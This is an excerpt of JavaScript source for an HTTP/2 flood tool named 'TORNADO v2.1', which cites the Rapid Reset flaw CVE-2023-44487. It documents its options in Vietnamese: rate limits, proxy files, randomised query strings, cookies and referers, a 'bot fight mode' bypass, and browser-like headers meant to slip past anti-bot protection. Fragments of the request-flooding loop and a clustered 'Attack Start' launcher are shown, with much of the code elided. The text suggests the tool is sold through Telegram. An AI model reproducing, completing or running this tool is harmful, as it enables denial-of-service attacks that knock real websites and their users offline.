...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
    TORNADO v2.1 Method With RST STREAM (CVE-2023-44487) 
    Developers to method:  - developer method 
    How to use & example:
    ...
    Options:
      ----query 1/2/3
Mô tả: chọn kiểu query string ngẫu nhiên (ví dụ: ?cf__chl_tk, ?fwfwfwfw, ?q=...) — dùng để thêm tham số query khác nhau cho mỗi request.

--delay <1-1000>
Mô tả: độ trễ giữa các request, đơn vị ms (ví dụ 1–100 ms là mức tối ưu). Dùng để điều chỉnh tốc độ gửi request.

--cookie "f=f"
Mô tả: đặt cookie tùy chỉnh cho request; hỗ trợ placeholder %RAND% để chèn chuỗi ngẫu nhiên.

--bfm true/null (bot fight mode)
Mô tả: bật/tắt chế độ “bot fight” (cơ chế thay đổi header/behaviour) — thường dùng để mô phỏng hành vi trình duyệt/bot khác nhau.

--referer https://target.com / rand
Mô tả: thiết lập header Referer cố định hoặc rand để tạo referer ngẫu nhiên (ví dụ các domain sinh ngẫu nhiên).

--postdata "user=f&pass=%RAND%"
Mô tả: gửi dữ liệu POST theo format x=y&..., hỗ trợ %RAND% để thêm giá trị ngẫu nhiên.

--randrate
Mô tả: bật cơ chế làm nhiễu/biến động rate theo tỉ lệ 1–90 (dùng để mô phỏng traffic không đồng đều).

--full
Mô tả: một chế độ chuyên sâu (ở công cụ gốc nhằm vào backend lớn) — không cần dùng để test thông thường.

--http 1/2/mix
Mô tả: chọn HTTP/1.1, HTTP/2, hoặc hỗn hợp; dùng để kiểm thử tương thích/hiệu năng theo phiên bản giao thức.

--debug
Mô tả: show status code / thông tin debug (giúp chẩn đoán nhưng có thể làm giảm throughput).

--header "f:f" or "f:f#f1:f1"
Mô tả: truyền header tùy chỉnh; nhiều header phân tách bằng #.

--legit
Mô tả: dùng “header hợp lệ/giống trình duyệt” (user-agent, accept, accept-language, v.v.) để mô phỏng request trông thực tế hơn.
...
if (currentDate > targetDate) {
    console.error('Error method has been outdate pm vip')
}

if (url.hostname.endsWith(blockedDomain)) {
    console.log(`Domain ${blockedDomain} blocked, if this mistake pm to tg vip`);
    process.exit(1);
}
...
if (isNaN(time) || time <= 0 || time > 986400) {
...
if (isNaN(ratelimit) || ratelimit <= 0 || ratelimit > 990) {
                ...
                function doWrite() {
                    ...
                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
                        ...
                        const currentRefererValue = refererValue === 'rand' ? (() => {
                            const domains = ["https://google.com", "https://facebook.com", "https://twitter.com", "https://example.com", "https://bing.com"];
...
// THE LOGIC/BUG ---------------
                        const headers = Object.entries({
                            ":method": reqmethod,
                            ":authority": `sub${Math.floor(Math.random() * 1000)}.${url.hostname}`,
                            ":scheme": "https",
...
if (cluster.isMaster) {
    ...
    console.log(`Attack Start ⚠️⚠️⚠️⚠️⚠️⚠️`);
